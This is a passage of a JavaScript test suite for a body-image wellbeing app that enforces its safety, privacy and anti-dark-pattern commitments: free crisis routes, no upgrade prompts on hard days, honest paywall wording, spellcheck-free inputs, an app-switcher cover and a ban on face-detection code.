  test('a lapsed user is not gated out of a single free route', () => {
    /* THE TEST THIS REPLACES ASSERTED ON PROSE, despite being named for the opposite. It
       grepped lib/entitlement.ts for the string `'/grounding'` — which the declaration
       contains whether or not `isGated` consults it. Deleting the
       `ALWAYS_FREE_ROUTES.includes(route)` line from isGated() entirely, so that every route
       including crisis support is gated for a lapsed user, left this file green. Now it runs
       the function. */
    for (const route of ALWAYS_FREE_ROUTES) {
      assert.equal(isGated(route, false), false,
        `${route} is gated for somebody with no entitlement, and it must never be`);
    }
    /* And the set has not quietly shrunk. Named separately from the list above so that
       removing a route from ALWAYS_FREE_ROUTES fails rather than trivially passing an empty
       loop — the shape that made the previous version decay. */
    for (const route of ['/grounding', '/support', '/checkin', '/', '/still', '/measure']) {
      assert.ok(ALWAYS_FREE_ROUTES.includes(route),
        `${route} dropped out of ALWAYS_FREE_ROUTES`);
    }
  });

  test('the free-route list is also intact in the source', () => {
    const ent = FILES.find((f) => f.path === 'lib/entitlement.ts');
    for (const route of ['/grounding', '/support', '/checkin']) {
      assert.ok(ent.src.includes(`'${route}'`), `${route} dropped out of ALWAYS_FREE_ROUTES`);
    }
  });

  /* Behavioural rather than a grep. The scheduler is the only thing in the app allowed to
     start a conversation the user did not, so it is worth testing what it actually does
     with a person who is having a bad week rather than what its source looks like. */
  test('a hard day silences every commercial and advocacy moment', async () => {
    const { nextMoment } = await import('../lib/moments.ts');
    const { baseAppState, qualifiedForAsk } = await import('./helpers/state.mjs');

    const ok = nextMoment(qualifiedForAsk(baseAppState()));
    assert.equal(ok?.id, 'week-one-ask', 'the ask should be eligible in the control case');

    // Same state, plus a hard-day tap today.
    const hard = baseAppState();
    hard.practice.push({ id: 'hd', date: new Date().toISOString().slice(0, 10), kind: 'hard-day' });
    assert.equal(nextMoment(qualifiedForAsk(hard)), null,
      'an upgrade prompt fired on the day somebody tapped "today is a hard day"');

    // Same state, plus a high distress rating today.
    const distressed = baseAppState();
    distressed.checkIns[0].suds = 9;
    assert.equal(nextMoment(qualifiedForAsk(distressed)), null,
      'an upgrade prompt fired on a day rated 9 out of 10 for distress');

    // Same state, plus a significant-avoidance day.
    const avoiding = baseAppState();
    avoiding.checkIns[0].avoidance = 'significant';
    assert.equal(nextMoment(qualifiedForAsk(avoiding)), null,
      'an upgrade prompt fired on a day appearance worry cancelled something');
  });

  test('a trial-ending notice still fires on a hard day', async () => {
    const { nextMoment } = await import('../lib/moments.ts');
    const { baseAppState, qualifiedForAsk } = await import('./helpers/state.mjs');

    const { trialing } = await import('./helpers/state.mjs');
    const s = baseAppState();
    s.practice.push({ id: 'hd', date: new Date().toISOString().slice(0, 10), kind: 'hard-day' });
    s.entitlement = trialing(1);

    const m = nextMoment(qualifiedForAsk(s));
    assert.equal(m?.id, 'trial-ending',
      'money is about to leave this person\'s account and the app promised to warn them');
  });

  test('the scheduler is the only thing that starts an unprompted conversation', () => {
    // If a screen grew its own prompt, it would bypass the daily budget and the distress
    // suppression without anybody noticing. MomentCard is the only renderer.
    for (const f of FILES) {
      if (f.path === 'components/MomentCard.tsx') continue; // the one renderer
      if (f.path.startsWith('content/')) continue; // where the words are defined
      assert.doesNotMatch(f.src, /MOMENT_COPY/,
        `${f.path} renders moment copy directly instead of going through the scheduler`);
    }
  });

  test('no countdown, expiry or scarcity language anywhere', () => {
    for (const f of FILES) {
      assert.doesNotMatch(
        f.src,
        /(offer|deal|discount)\s+(ends|expires)|limited time|spots? left|act now|last chance/i,
        `${f.path} contains manufactured urgency`
      );
    }
  });

  test('no fabricated social proof', () => {
    for (const f of FILES) {
      // Ratings, review counts, and "join N people" claims about users Anneal lacks.
      assert.doesNotMatch(f.src, /rated \d|\d[\d,.]*\+? (users|reviews|ratings|members)|join \d/i,
        `${f.path} claims social proof this app cannot substantiate`);
    }
  });

  test('the evidence qualifier travels with every screen that renders proof points', () => {
    for (const f of FILES) {
      if (f.path.startsWith('content/')) continue;
      if (!/PROOF_POINTS/.test(f.src)) continue;
      assert.match(f.src, /PROOF_QUALIFIER/,
        `${f.path} renders evidence without the "not therapy, not trialled" qualifier`);
    }
  });

  test('the trial states a date and promises a reminder', () => {
    const pay = FILES.find((f) => f.path === 'app/paywall.tsx');
    assert.match(pay.src, /trialEndDate\(/, 'the paywall shows no trial end date');
    assert.match(pay.src, /remind you/i, 'the paywall does not promise a trial reminder');
  });

  test('the paywall discloses the renewal beside the button, not behind a link', () => {
    /* Apple 3.1.2. The screen used to say "Free until 9 September. Then $79.99/yr." — the
       price, and nothing at all about the fact that it repeats every year until stopped. */
    const pay = FILES.find((f) => f.path === 'app/paywall.tsx');
    assert.match(pay.src, /RENEWAL_TERMS/, 'the paywall states no renewal terms');
  });

  test('nothing a customer reads calls the one-off plan a lifetime', () => {
    /* App Review rejects the word: nobody can guarantee content for the length of a
       customer's life. See docs/APP-STORE.md §5.4. The Plan key stays `lifetime` because it
       is an internal identifier; the label a person reads is "Pay once". */
    for (const f of FILES) {
      assert.doesNotMatch(f.src, /label: ['"]Lifetime/i,
        `${f.path} labels a purchasable plan "Lifetime"`);
      assert.doesNotMatch(f.src, />\s*Lifetime\b/,
        `${f.path} renders the word "Lifetime" to a customer`);
    }
  });

  test('the trial-ending notice does not hardcode how long is left', () => {
    /* It fires on each of the last three days (`left <= 2 && left >= 0`), so a fixed
       "Two days left" is wrong on two of them. A warning that is wrong about when is not
       much of a warning. The card computes it from the entitlement's own expiry. */
    const copy = FILES.find((f) => f.path === 'content/copy.ts');
    const block = copy.src.slice(copy.src.indexOf("'trial-ending'"));
    const title = block.match(/title: '([^']*)'/)[1];
    assert.doesNotMatch(title, /\b(one|two|three|1|2|3)\b/i,
      `the trial-ending fallback title names a day count it cannot know: "${title}"`);

    const card = FILES.find((f) => f.path === 'components/MomentCard.tsx');
    assert.match(card.src, /daysUntilExpiry/,
      'the trial-ending card does not read how long is actually left');
  });

  test('the paywall shows the user their own number, not only a citation', () => {
    /* The headline has always been "You have seen your number." For a long time the screen
       then did not show it, and put a meta-analysis effect size in its place. That is the
       whole proposition of the product given away at the moment of the ask: somebody buys
       because their own hours moved, not because of somebody else's trial. */
    const pay = FILES.find((f) => f.path === 'app/paywall.tsx');
    assert.match(pay.src, /computeReclaimed/, 'the paywall does not read the user\'s own figure');
    assert.match(pay.src, /reclaimed\.hours/, 'the paywall does not render the user\'s own figure');
  });

  test('the paywall answers the privacy question, not only the efficacy one', () => {
    /* Privacy is the second-biggest objection in this category, and a person deciding
       whether to pay is deciding in the same moment whether to hand a body-image app twelve
       weeks of their most private writing. It was answered in onboarding and in the store
       listing, and nowhere on the screen asking for a card. */
    const pay = FILES.find((f) => f.path === 'app/paywall.tsx');
    assert.match(pay.src, /nothing leaves this phone/i, 'the paywall makes no privacy promise');
  });

  test('the paywall dismiss says what it does, and does not shame', () => {
    const pay = FILES.find((f) => f.path === 'app/paywall.tsx');
    assert.match(pay.src, /accessibilityLabel="Close"/, 'no plainly labelled dismiss');
    assert.doesNotMatch(pay.src, /no thanks,? i|i don'?t want|stay stuck/i, 'the paywall confirmshames');
  });

  /* Run the real function over every bucket rather than regexing the file: what matters is
     what a customer can actually be shown, and a source grep also trips over the apostrophes
     in the comments explaining why these rules exist. */
  test('the cost mirror promises nothing and compares nobody, at every input', async () => {
    const { costMirror, COST_MIRROR_FOOTER } = await import('../lib/cost.ts');
    const { PREOCCUPATION_MINUTES, PREOCCUPATION_BUCKETS } = await import('../types/index.ts');

    const shown = [COST_MIRROR_FOOTER];
    for (const bucket of PREOCCUPATION_BUCKETS) {
      const m = costMirror({
        capturedAt: new Date().toISOString(),
        preoccupationMinutes: PREOCCUPATION_MINUTES[bucket],
        urge: 5,
        avoidance: 'small',
        suds: 5,
      });
      shown.push(m.headline, m.sub);
    }
    const empty = costMirror(null);
    shown.push(empty.headline, empty.sub);

    for (const s of shown) {
      assert.doesNotMatch(s, /you (will|could|can|might) (get|win|save|reclaim|feel|be)|guarantee|proven to/i,
        `cost mirror makes a promise: "${s}"`);
      assert.doesNotMatch(s, /percentile|than (most|other|average)|better than|compared to (other|most)|average person/i,
        `cost mirror compares the user to other people: "${s}"`);
      assert.doesNotMatch(s, /!/, `cost mirror editorialises: "${s}"`);
      assert.doesNotMatch(s, /shocking|huge|terrible|awful|wasted|waste/i,
        `cost mirror editorialises: "${s}"`);
    }
  });

  test('the cost mirror stays quiet when there is nothing worth stating', async () => {
    const { costMirror } = await import('../lib/cost.ts');
    const low = costMirror({
      capturedAt: new Date().toISOString(),
      preoccupationMinutes: 8,
      urge: 2,
      avoidance: 'none',
      suds: 2,
    });
    assert.equal(low.worthShowing, false,
      'below ~15 min/day, presenting a cost figure would be manufacturing a problem to sell against');
  });
});

describe('SAFETY.md itself stays in place', () => {
  const safety = readFileSync(join(ROOT, 'SAFETY.md'), 'utf8');

  test('documents every numbered constraint', () => {
    for (let i = 1; i <= 13; i++) {
      assert.match(safety, new RegExp(`^## ${i}\\.`, 'm'), `missing constraint ${i}`);
    }
  });

  test('is substantial rather than a stub', () => {
    assert.ok(safety.split(/\s+/).length > 900, 'SAFETY.md is too thin to be useful');
  });
});

describe('the two-taps promise is a route, not a sentence', () => {
  /* SAFETY.md §4: grounding, breathing, the hard-day path, the daily check-in and all crisis
     support are "reachable in two taps or fewer from any screen", and docs/SUBMISSION-ANSWERS
     tells App Review the same thing "via the Support control in the top right".
     Neither was true. The Support screen held crisis lines, a therapist section and an email
     link — nothing else — so from Learn or Progress breathing was three taps and from inside
     a module it was four. A reviewer testing the sentence as written would have found it
     false, which is the worst place for this particular claim to fail.
     The Support pill is one tap from every screen (mounted outside the Stack in
     app/_layout.tsx), so a direct row on that screen is the second tap. These assertions hold
     the routes rather than the prose. */

  const support = withoutComments(readFileSync(join(ROOT, 'app/support.tsx'), 'utf8'));

  test('the Support screen carries a direct route to each thing SAFETY.md names', () => {
    for (const [what, route] of [
      ['breathing', "'/grounding?tool=breath'"],
      ['grounding', "'/grounding?tool=senses'"],
      ['the hard-day path', "'/grounding?mode=hard'"],
      ['the daily check-in', "'/checkin'"],
    ]) {
      assert.ok(
        support.includes(route),
        `SAFETY.md promises ${what} is two taps from any screen, and app/support.tsx has no `
        + `row for ${route} — from Learn it is three taps, from a module four`,
      );
    }
  });

  test('they open the exercise, not the menu that lists it', () => {
    /* `/grounding` with no parameter is the menu, which would put every one of these back at
       three taps and quietly make the promise false again. */
    assert.doesNotMatch(support, /router\.push\('\/grounding'\)/,
      'the Support screen routes to the grounding menu, which is one tap too many');
  });

  test('and the claim still says two, in both places that make it', () => {
    for (const rel of ['SAFETY.md', 'docs/SUBMISSION-ANSWERS.md']) {
      assert.match(readFileSync(join(ROOT, rel), 'utf8'), /two taps/i,
        `${rel} no longer states the two-taps promise — if that is deliberate, the other file `
        + 'and the App Review notes need to agree');
    }
  });
});

describe('nothing a person writes reaches a keyboard cache or a spellcheck server', () => {
  /* components/ui.tsx has stated this rule since before there were five inputs to apply it
     to, and app/journal.tsx applies it on all three of its raw ones. app/plan.tsx did not.
     It is a raw TextInput rather than the shared `Field`, and it holds `whoToTell` — the
     names of real people — and `myLine`, which content/modules.ts defines as the point at
     which somebody would contact a professional about hurting themselves.
     On iOS, autoCorrect defaults true, so those words enter the keyboard's learned lexicon
     (Library/Keyboard/*-dynamic-text.dat), which survives app deletion and is a known
     forensic artefact. On web, react-native-web renders a <textarea>, and Chrome's Enhanced
     Spellcheck and Edge's Microsoft Editor upload the whole field to Google and Microsoft.
     A rule written in a comment is a habit. This makes it a rule. */

  const NEEDED = ['spellCheck={false}', 'autoCorrect={false}', 'autoComplete="off"'];

  /** Every `<TextInput` in the tree, with the text of its own prop block. */
  const inputs = () => {
    const found = [];
    for (const f of FILES) {
      const src = withoutComments(f.src);
      let i = src.indexOf('<TextInput');
      while (i !== -1) {
        /* To the end of the opening tag. Nested braces make a naive `>` search wrong, so
           depth is tracked — a style object contains `}` and `>` of its own. */
        let depth = 0;
        let j = i;
        for (; j < src.length; j += 1) {
          const ch = src[j];
          if (ch === '{') depth += 1;
          else if (ch === '}') depth -= 1;
          else if (ch === '>' && depth === 0) break;
        }
        found.push({ path: f.path, props: src.slice(i, j) });
        i = src.indexOf('<TextInput', j);
      }
    }
    return found;
  };

  test('there are text inputs to check', () => {
    const all = inputs();
    assert.ok(all.length >= 4, `only found ${all.length} TextInputs — has the scan broken?`);
  });

  test('every text input in the app sets all three', () => {
    for (const { path, props } of inputs()) {
      for (const need of NEEDED) {
        assert.ok(
          props.includes(need),
          `${path} has a <TextInput> without ${need}.\n`
          + '  Every field somebody types their own words into must set all three — see the '
          + 'comment in components/ui.tsx. Use the shared `Field` component and this is free.',
        );
      }
    }
  });

  test('the shared Field sets them too, so using it is the safe default', () => {
    const ui = withoutComments(readFileSync(join(ROOT, 'components/ui.tsx'), 'utf8'));
    for (const need of NEEDED) {
      assert.ok(ui.includes(need), `components/ui.tsx Field no longer sets ${need}`);
    }
  });
});

describe('what is on screen does not survive in the app-switcher snapshot', () => {
  /* iOS writes a snapshot of the live screen to Library/Caches/Snapshots/<bundle-id>/ every
     time the app backgrounds, and shows it to anyone who double-taps the home indicator. A
     thought record on screen at that moment becomes an unencrypted PNG in the container.
     This is the one place the encryption at rest is bypassed by the OS rather than by a
     decision, and it is worse than the unlocked-phone case lib/crypto.ts knowingly accepts:
     the writing is readable from the switcher without opening the app.
     Deliberately NOT an app lock. lib/crypto.ts is explicit that a passcode between somebody
     and the hard-day path at 2am is the wrong failure. This appears only as the app leaves
     the screen and is gone before a returning user sees it. */
  const layout = withoutComments(readFileSync(join(ROOT, 'app/_layout.tsx'), 'utf8'));

  test('the app covers itself when it stops being the active app', () => {
    assert.match(layout, /setCovered\(next !== 'active'\)/,
      'nothing covers the screen on backgrounding, so the app-switcher snapshot captures '
      + 'whatever was on it — including an open thought record');
  });

  test('it covers on inactive as well as background', () => {
    /* 'inactive' is what fires for the app-switcher gesture and the share sheet, and it
       fires FIRST. Covering only on 'background' misses the case the snapshot is taken in. */
    assert.doesNotMatch(layout, /setCovered\(next === 'background'\)/,
      "the cover keys on 'background' alone; the switcher gesture fires 'inactive' first");
  });

  test('the cover is opaque, not a blur or a fade', () => {
    /* Blurred legible text is legible text at the size a snapshot is displayed. */
    const at = layout.indexOf('{covered && (');
    assert.ok(at > 0, 'the cover is no longer rendered');
    const block = layout.slice(at, at + 600);
    assert.match(block, /backgroundColor: c\.bg/, 'the cover is not painted with a solid ground');
    assert.doesNotMatch(block, /opacity|BlurView|intensity/,
      'the cover is translucent or blurred, so the snapshot still contains readable text');
  });
});

describe('the camera creates no biometric identifier, and the policy says so', () => {
  /* Illinois BIPA, Texas CUBI and Washington's biometric statute all turn on a TEMPLATE being
     created — a scan of face geometry — not on a camera being switched on. BIPA expressly
     excludes photographs, attaches $1,000/$5,000 per-violation statutory damages, and carries
     a private right of action. A live preview that produces nothing is outside all three.
     What would put the app inside them is one line of somebody's future work: face detection,
     face landmarking, an on-device face model, an ARKit face anchor, a Vision landmark
     request, or a "line your face up here" guide. Any of those creates a scan of face
     geometry, and being on-device would then be a much weaker defence than it sounds, because
     BIPA §15(b) regulates COLLECTION rather than retention — and §15(a) requires a public
     retention schedule to exist BEFORE any collection begins.
     So this is a tripwire, not a description. */

  test('nothing in the source detects, tracks or measures a face', () => {
    const FACE = /FaceDetector|face-detector|faceDetection|detectFaces|VNDetectFaceLandmarks|ARFaceAnchor|ARFaceTracking|faceLandmarks|FaceMesh|faceGeometry|BlazeFace/i;
    for (const f of FILES) {
      assert.doesNotMatch(withoutComments(f.src), FACE,
        `${f.path} looks at the face in the frame. That creates a scan of face geometry and `
        + 'puts the app inside BIPA, CUBI and Washington RCW 19.375 — see the note in '
        + 'legal/privacy-policy.md §4, and read BIPA §15(a) before writing another line.');
    }
  });

  test('no face or biometric package is installed', () => {
    const pkg = JSON.parse(readFileSync(join(ROOT, 'package.json'), 'utf8'));
    const names = Object.keys({ ...pkg.dependencies, ...pkg.devDependencies });
    for (const n of names) {
      assert.ok(!/face|biometric|vision-camera|mediapipe/i.test(n),
        `package.json installs "${n}", which may process faces. See legal/privacy-policy.md §4.`);
    }
  });

  test('the mirror renders the camera with no ref, so capture is unreachable', () => {
    /* Not merely unused — structurally unreachable. takePictureAsync and recordAsync are
       methods on the ref, and there is no ref. */
    const mirror = withoutComments(readFileSync(join(ROOT, 'components/MirrorSurface.tsx'), 'utf8'));
    assert.doesNotMatch(mirror, /takePictureAsync|recordAsync|captureRef|toDataURL|drawImage/,
      'the mirror can now capture. Nothing in this app may.');
    const tag = mirror.slice(mirror.indexOf('<NativeCamera'), mirror.indexOf('<NativeCamera') + 200);
    assert.doesNotMatch(tag, /\bref=/,
      'the CameraView has a ref, which makes takePictureAsync reachable');
  });

  test('and the privacy policy states it, in the words the statutes use', () => {
    const policy = readFileSync(join(ROOT, 'legal/privacy-policy.md'), 'utf8')
      .replace(/<!--[\s\S]*?-->/g, '');
    assert.match(policy, /biometric identifier/i,
      'the privacy policy no longer states that no biometric identifier is collected');
    assert.match(policy, /scan of face geometry/i,
      'the policy no longer uses the statutory phrase, which is the one that matters');
  });
});
